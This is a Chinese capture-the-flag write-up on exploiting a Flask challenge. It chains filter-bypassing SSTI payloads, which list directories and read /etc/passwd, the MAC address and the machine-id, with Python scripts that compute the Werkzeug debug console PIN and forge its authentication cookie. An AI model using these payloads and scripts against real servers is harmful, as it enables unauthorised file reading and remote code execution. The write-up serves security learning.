首先名字就告诉我们这是一个Flask写的程序，那大概率是SSTI。

主页面导航栏有一个提示

![image-20250908192608627](https://raw.githubusercontent.com/ssaa769/typora-images/main/typora/image-20250908192608627.png)

直接点进去只有一张图，查看源码

![image-20250908192758715](https://raw.githubusercontent.com/ssaa769/typora-images/main/typora/image-20250908192758715.png)

`<!--    PIN  --->`提示关键是PIN码计算，我曾经学习的资源如下
【SSTI模板注入】 https://www.bilibili.com/video/BV1tj411u7Bx/?p=21&share_source=copy_web&vd_source=8a98cdef296bba2f5f0b8ef5a28d4bdc

写一个简单的flask程序如下：

```python
from flask import Flask

app = Flask(__name__)

@app.route('/')
def index():
    return "hello zdx!"

if __name__ == "__main__":
    app.run(debug=True)
```

运行后控制台打印如下信息：

``` * Serving Flask app 'main'
 * Debug mode: on
WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
 * Running on http://127.0.0.1:5000
Press CTRL+C to quit
 * Restarting with stat
 * Debugger is active!
 * Debugger PIN: 319-471-534
```

这里会给你一串PIN码，它有什么用呢？当你访问/console页面，会提示你输入PIN码，我们访问例题靶机的/console

![image-20250908193724730](https://raw.githubusercontent.com/ssaa769/typora-images/main/typora/image-20250908193724730.png)

输入PIN码后就可以获取控制台权限！

**大于`Werkzeug==3.0.3` 版本仅支持回环地址127.0.0.1访问/console**

PIN码只有你开启debug=True时才生效，一般只有测试时开这个，目的是修改源文件后不需要重新加载文件，比较方便。因此当时忘记关闭debug选项时,如果攻击者输入了正确的PIN，即可获得控制台权限。

PIN码是根据一些参数计算出来的，如下：

1. username → 执行代码时候的用户名,可以读/etc/passwd猜测
2. getattr(app, "**name**", app.**class**.**name**) → 一般是Flask
3. modname → 固定值默认 flask.app
4. getattr(mod, "**file**", None) → app.py 文件所在路径，可以通过报错信息获得
5. str(uuid.getnode()) →  MAC 地址，读 `/sys/class/net/eth0/address`或者`/sys/class/net/ens33/address`
6. get_machine_id() → 首先读取 `/etc/machine-id`(文件1)，然后读取 `/proc/sys/kernel/random/boot_id`(文件2)。接着读取 `/proc/self/cgroup`（文件3），取第一行的最后一个斜杠 `/` 后面的所有字符串。

### 教训：有时候是单文件1内容，有时候是文件1或者文件2和文件3拼接，网上也有说单文件3的。建议都试试，反正一共四种。

获取了这六个参数之后，我们就可以在本地使用脚本计算PIN。注意计算过程和werkzeug的版本有关，1.0.x使用md5，2.0.x及以上（一般是python3.8及以上）使用sha1。我们在自己写的flask程序的`app = Flask(__name__)`处打上断点，步入app.py中，搜索werkzeug：

![image-20250909110008627](https://raw.githubusercontent.com/ssaa769/typora-images/main/typora/image-20250909110008627.png)

ctrl+左键查看run_simple,在它下面找到了debug开启时的动作(PIN码要开debug模式)：

![image-20250909110242440](https://raw.githubusercontent.com/ssaa769/typora-images/main/typora/image-20250909110242440.png)

查看DebuggedApplication，在它上方就看到了PIN码计算过程：

![image-20250909110343682](https://raw.githubusercontent.com/ssaa769/typora-images/main/typora/image-20250909110343682.png)

我们整理一下，脚本如下：

```python
import hashlib
from itertools import chain

# 可能是公开的信息部分
probably_public_bits = [
    'root',  # /etc/passwd
    'flask.app',  # 默认值
    'Flask',  # 默认值
    '/usr/local/lib/python3.8/site-packages/flask/app.py'  # moddir，报错得到
]

# 私有信息部分
private_bits = [
    '2485377568585',  # /sys/class/net/eth0/address 十进制
    '653dc458-4634-42b1-9a7a-b22a082e1fce898ba65fb61b89725c91a48c418b81bf98bd269b6f97002c3d8f69da8594d2d2'
    # machine-id部分
]

# 创建哈希对象，低版本用md5()
h = hashlib.sha1()

# 迭代可能公开和私有的信息进行哈希计算
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)

# 加盐处理
h.update(b'cookiesalt')

# 生成 cookie 名称
cookie_name = '__wzd' + h.hexdigest()[:20]
print(cookie_name)

# 生成 pin 码
num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]

# 格式化 pin 码
rv = None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
            break
    else:
        rv = num

print(rv)
```

可以看到其实总体计算过程就是简单的加盐算哈希，盐值还是固定的。

这里算了一个cookie值，它有什么用呢？你在/console输入pin码后，服务端给你植入这个cookie，这样你以后访问这个页面用控制台就不用重新输入PIN码。

我们打开burpsuite抓个包看看：

![image-20250909111009275](https://raw.githubusercontent.com/ssaa769/typora-images/main/typora/image-20250909111009275.png)

可以看到，第一次提交pin码的时候，服务端Set-Cookie植入cookie，我们在控制台执行一下代码：

![image-20250909111153153](https://raw.githubusercontent.com/ssaa769/typora-images/main/typora/image-20250909111153153.png)

请求时浏览器自动带上了这个cookie用于认证身份，也就是会话cookie。

请求中多了两个有意思的参数，先讲s。s是在你访问/console时返回的html的表单/元素中，并且 作为一个隐藏字段。它是一个随机的值，本质上是ANTI-CSRF TOKEN。（提一下如果同时存在XSS就没用了，因为XSS可以读取这个值）

frm则是调用帧的层级，未发生错误时就在最顶层为0

这里顺便给出计算cookie的脚本（可以同之前一样下断点找）

```python
import hashlib
import time

# A week  其实就是有效期
PIN_TIME = 60 * 60 * 24 * 7

def hash_pin(pin: str) -> str:
    return hashlib.sha1(f"{pin} added salt".encode("utf-8", "replace")).hexdigest()[:12]

print(f"{int(time.time()*2+60 * 60 * 24 * 7)}|{hash_pin('598-725-733')}")
```

cookie的值本来是`int(time.time())}|{hash_pin(pin)`

但是服务端要验证cookie有效期，`return (time.time() - PIN_TIME) < int(ts)`要返回True，int(ts)就是我们生成的cookie的前半段，因此我们脚本中是*2+PIN_TIME，只要够大就行。

能伪造Cookie的关键就在于服务器是无状态的，并不存储cookie的值，只是读取并使用，所以cookie是可以篡改的。后来有了session来存，cookie带上SessionID。

总算讲清楚了PIN码，接下来回到题目：

在base64解码的页面中的输入框输入e3t9fQ==，即{{}}的base64编码，出现报错，找到app.py：`/usr/local/lib/python3.7/site-packages/flask/app.py`

这里`{{config}}`可以读取，但是`os` `*` `popen`等被过滤。其他像`_'"[]`等倒是还在。其实不难理解，过滤*是`{{7*7}}`这样的payload太常见，过滤os和popen是因为不过滤的话都不需要用PIN码。

我们只需要读取文件获得计算PIN码所需即可。

`{{''.__class__.__base__[0].__subclasses__()[xxx]}}`

这里一般找两个，一个是warnings.catch_warnings,索引一般是102;一个是os._wrap_close，索引一般是75.

找到后最通用的payload就是利用`__builtins__`,通用好记

要列目录的话可以利用import导入os模块，过滤可以字符串拼接绕过：

`{{().__class__.__bases__[0].__subclasses__()[102].__init__.__globals__.__builtins__['__imp'+'ort__']('o'+'s').listdir('/')}}`

根目录有一个this_is_the_flag.txt，因为过滤flag无法读，我们要利用pin码的控制台。

（其实可以`open('txt.galf_eht_si_siht/'[::-1])`或者`open('this_is_the_f'+'lag.txt')`绕过过滤）

这里是没有导入好的os，所以我们需要手动导入。查看/etc/passwd:

`{{().__class__.__bases__[0].__subclasses__()[102].__init__.__globals__.__builtins__['open']('/etc/passwd').read()}}`

用户是` flaskweb:x:1000:1000::/home/flaskweb:/bin/sh`

然后读`/sys/class/net/eth0/address`，是`ea:ba:1f:79:e0:16`

接着读`/etc/machine-id`,是`1408f836b0ca514d796cbf8960e45fa1`

下面给出最后的脚本，因为是python3.7，werkzeug也是低版本所以用md5：

```python
import hashlib
from itertools import chain

probably_public_bits = [
    'flaskweb',#服务器运行flask所登录的用户名
    'flask.app',#modname
    'Flask',#getattr(app, "\_\_name__", app.\_\_class__.\_\_name__)
    '/usr/local/lib/python3.7/site-packages/flask/app.py',#flask库下app.py的绝对路径
]
private_bits = [
    '77970377601958',#当前网络的mac地址的十进制数
    '1408f836b0ca514d796cbf8960e45fa1'#机器的id
]
"""1408f836b0ca514d796cbf8960e45fa1"""
"""a783d0b9-308a-4743-9d3c-915598e38fbe"""
"""docker-b064f6b61584824a4204fcca5a8accc603545e547afa11904cf93c119fae43b8.scope"""

h = hashlib.md5()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')
cookie_name = '__wzd' + h.hexdigest()[:20]
num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]
rv =None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
            break
    else:
        rv = num
print(rv)
```

### 总结：一看werkzeug版本（可以根据python版本看），使用md5还是sha1；二看get_machine_id()到底是什么，网上结论众说纷纭，建议都试试，环境很复杂，实践出真知。

